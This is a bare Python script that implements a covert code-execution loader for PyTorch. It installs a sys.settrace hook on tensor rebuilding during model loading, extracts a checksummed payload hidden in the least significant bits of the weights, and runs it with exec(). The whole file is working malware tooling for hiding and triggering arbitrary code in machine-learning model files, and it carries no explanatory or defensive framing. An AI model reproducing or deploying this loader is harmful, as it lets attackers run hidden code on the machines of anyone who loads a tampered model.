import sys
import sys
import torch

def stego_decode(tensor, n=1):
    import struct
    import hashlib
    import numpy as np

    assert 1 <= n <= 23, "n must be between 1 and 23"

    # Ensure tensor is at least 1D and in numpy format
    tensor = np.atleast_1d(tensor)

    # Convert to uint8 view safely
    try:
        byte_view = tensor.view(np.uint8)
    except ValueError:
        byte_view = tensor.astype(np.float32).view(np.uint8)

    # Extract bits
    bits = np.unpackbits(byte_view)

    # Calculate how many bits per float
    bits_per_float = tensor.dtype.itemsize * 8

    # Reshape bits into columns of each float's bits
    bit_columns = [bits[i::bits_per_float] for i in range(8 - n, 8)]
    bit_matrix = np.vstack(bit_columns)

    # Flatten in Fortran order and pack into bytes
    packed = np.packbits(bit_matrix.ravel(order="F"))
    payload = packed.tobytes()

    # Try to parse header
    try:
        size, checksum = struct.unpack("i 64s", payload[:68])
        if size < 0 or size > (tensor.size * n) // 8:
            return None
    except (struct.error, ValueError):
        return None

    # Extract message
    message = payload[68:68 + size]

    # Verify checksum
    if hashlib.sha256(message).hexdigest().encode("utf-8") != checksum:
        return None

    return message
def call_and_return_tracer(frame, event, arg):
    global return_tracer
    global stego_decode
    def return_tracer(frame, event, arg):
        # Ensure we've got a tensor
        if torch.is_tensor(arg):
            # Attempt to parse the payload from the tensor
            payload = stego_decode(arg.data.numpy(), n=1)
            if payload is not None:
                # Remove the trace handler
                sys.settrace(None)
                # Execute the payload
                exec(payload.decode("utf-8"))

    # Trace return code from _rebuild_tensor_v2
    if event == "call" and frame.f_code.co_name == "_rebuild_tensor_v2":
        frame.f_trace_lines = False
        return return_tracer

sys.settrace(call_and_return_tracer)
#
#


